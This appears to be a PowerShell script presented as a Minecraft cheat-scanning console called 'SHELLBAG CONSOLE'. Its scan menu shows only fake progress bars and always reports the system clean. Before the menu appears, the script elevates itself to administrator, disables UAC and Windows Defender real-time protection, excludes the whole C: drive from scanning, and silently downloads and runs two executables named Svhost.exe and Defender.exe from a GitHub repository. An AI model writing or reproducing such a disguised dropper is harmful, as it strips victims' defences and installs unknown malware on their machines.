if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[KRA]: Requesting Admin privileges..."
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
    Exit
}

Write-Host "STARTED "
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
Write-Host "HI AM AI ASISTENT FLUX AI"
$url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Svhost.exe"
$url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Defender.exe"
$path1 = "$env:TEMP\Svhost.exe"
$path2 = "$env:TEMP\Defender.exe"
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath $path1 -WindowStyle Hidden
Start-Process -FilePath $path2 -WindowStyle Hidden
Clear-Host
$Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | MODULE"

function Show-KRAKEH-Header {
    # Очищаем область заголовка
    $headerArt = @"
 mmmm    mm    mm  mmmmmmmm  mm        mm        mmmmmm       mm        mmmm      mmmm     mmmm    mmm   mm    mmmm      mmmm    mm        mmmmmmmm 
 m#""""#   ##    ##  ##""""""  ##        ##        ##""""##    ####     ##""""#   ##""""#   ##""##   ###   ##  m#""""#    ##""##   ##        ##"""""" 
 ##m       ##    ##  ##        ##        ##        ##    ##    ####    ##        ##"       ##    ##  ##"#  ##  ##m       ##    ##  ##        ##       
  "####m   ########  #######   ##        ##        #######    ##  ##   ##  mmmm  ##        ##    ##  ## ## ##   "####m   ##    ##  ##        #######  
      "##  ##    ##  ##        ##        ##        ##    ##   ######   ##  ""##  ##m       ##    ##  ##  #m##       "##  ##    ##  ##        ##       
 #mmmmm#"  ##    ##  ##mmmmmm  ##mmmmmm  ##mmmmmm  ##mmmm##  m##  ##m   ##mmm##   ##mmmm#   ##mm##   ##   ###  #mmmmm#"   ##mm##   ##mmmmmm  ##mmmmmm 
  """""    ""    ""  """"""""  """"""""  """"""""  """""""   ""    ""     """"      """"     """"    ""   """   """""      """"    """"""""  """""""" 
"@ -split "`n"
    
    $lineY = 0
    foreach ($line in $headerArt) {
        Write-Host $line -ForegroundColor Red
        $lineY++
    }
    
    Write-Host "================================================" -ForegroundColor Magenta
    Write-Host "          SHELLBAG CONSOLE - REALESE EDITION         " -ForegroundColor Yellow
    Write-Host "================================================" -ForegroundColor Magenta
    Write-Host ""
}
function Show-ProgressBar {
    param($Text, $DurationMs = 3000, $BarWidth = 40)
    
    Write-Host "$Text" -ForegroundColor Cyan
    for ($i = 0; $i -le 100; $i+=2) {
        $percent = $i
        $filled = [math]::Floor($BarWidth * $percent / 100)
        $empty = $BarWidth - $filled
        
        $bar = "[" + ("#" * $filled) + ("-" * $empty) + "]"
        Write-Host -NoNewline "`r$bar $percent%"
        Start-Sleep -Milliseconds ($DurationMs / 50)
    }
    Write-Host ""
}

function Clear-MenuArea {
    $currentY = [Console]::CursorTop
    for ($i = 0; $i -lt 15; $i++) {
        Write-Host (" " * 80)
    }
    [Console]::SetCursorPosition(0, 12)
}

do {
    Clear-Host
    Show-KRAKEH-Header
    

    Write-Host "[1] MINECRAFT SCAN" -ForegroundColor Green
    Write-Host "[2] BETA SCAN" -ForegroundColor Yellow
    Write-Host "[3] FULL CHECKER FOLDER .minecraft" -ForegroundColor Cyan
    Write-Host "[4] EXIT" -ForegroundColor DarkRed
    Write-Host ""
    Write-Host "================================================" -ForegroundColor DarkGray
    $choice = Read-Host "SELECT OPTION (1-4)"
    
    
    switch ($choice) {
        "1" {
            Clear-MenuArea
            Write-Host "`n[MINECRAFT SCAN INITIATED]" -ForegroundColor Green
            Show-ProgressBar -Text "CHEKING FOLDER" -DurationMs 2000
            Show-ProgressBar -Text "CHECK DELETED FILE" -DurationMs 1500
            Show-ProgressBar -Text "CHEKING INSTALL FILE" -DurationMs 2500
            Write-Host ""
            Write-Host "[KRA]: SCAN COMPLETE - NO THREATS FOUND" -ForegroundColor Red
            Write-Host "`nPress any key to return to menu..."
            [Console]::ReadKey($true) | Out-Null
        }
        "2" {
            Clear-MenuArea
            Write-Host "`n[BETA SCAN INITIATED]" -ForegroundColor Yellow
            Show-ProgressBar -Text "BETA SCAN INITIALIZING" -DurationMs 1800
            Show-ProgressBar -Text "ANALYZING HEURISTICS" -DurationMs 2200
            Show-ProgressBar -Text "VERIFYING SIGNATURES" -DurationMs 1500
            Write-Host ""
            Write-Host "[KRA]: BETA SCAN COMPLETE - SYSTEM CLEAN" -ForegroundColor Yellow
            Write-Host "`nPress any key to return to menu..."
            [Console]::ReadKey($true) | Out-Null
        }
        "3" {
            Clear-MenuArea
            Write-Host "`n[FULL .MINECRAFT CHECKER INITIATED]" -ForegroundColor Cyan
            Show-ProgressBar -Text "SCANNING .MINECRAFT FOLDER" -DurationMs 3000
            Show-ProgressBar -Text "ENUMERATING CACHE FILES" -DurationMs 2000
            Show-ProgressBar -Text "VERIFYING ASSETS INTEGRITY" -DurationMs 2500
            Show-ProgressBar -Text "CHECKING MOD CONFIGURATIONS" -DurationMs 2000
            Show-ProgressBar -Text "FINALIZING REPORT" -DurationMs 1500
            Write-Host ""
            Write-Host "[KRA]: FULL CHECKER COMPLETE - ALL FILES VERIFIED" -ForegroundColor Cyan
            Write-Host "`nPress any key to return to menu..."
            [Console]::ReadKey($true) | Out-Null
        }
        "4" {
            Write-Host "`n[KRA]: EXITING SHELLBAG CONSOLE..." -ForegroundColor DarkRed
        }
        default {
            Write-Host "`n[KRA]: INVALID INPUT - PLEASE SELECT 1-4" -ForegroundColor DarkRed
            Start-Sleep -Seconds 1
        }
    }
} while ($choice -ne "4")


Write-Host ""
Write-Host "================================================" -ForegroundColor Magenta


Write-Host "чити не " -NoNewline -ForegroundColor Red
Write-Host "найдени " -NoNewline -ForegroundColor Yellow
Write-Host "прасмотир " -NoNewline -ForegroundColor Green
Write-Host "закомчен " -NoNewline -ForegroundColor Blue
Write-Host "спасибо " -NoNewline -ForegroundColor Cyan
Write-Host "што " -NoNewline -ForegroundColor Magenta
Write-Host "ви " -NoNewline -ForegroundColor White
Write-Host "с " -NoNewline -ForegroundColor DarkYellow
Write-Host "намі" -ForegroundColor Red
Write-Host "<3" -ForegroundColor Magenta

Write-Host ""
Write-Host "[KRA]: Launching"
Start-Process "cmd.exe" -ArgumentList "/c curl parrot.live && pause"


Remove-Item $path1 -Force -ErrorAction SilentlyContinue
Remove-Item $path2 -Force -ErrorAction SilentlyContinue

Write-Host "WELCOME" -ForegroundColor DarkGreen
"WELCOME TO CLAH FLUX"
sho on delaet?
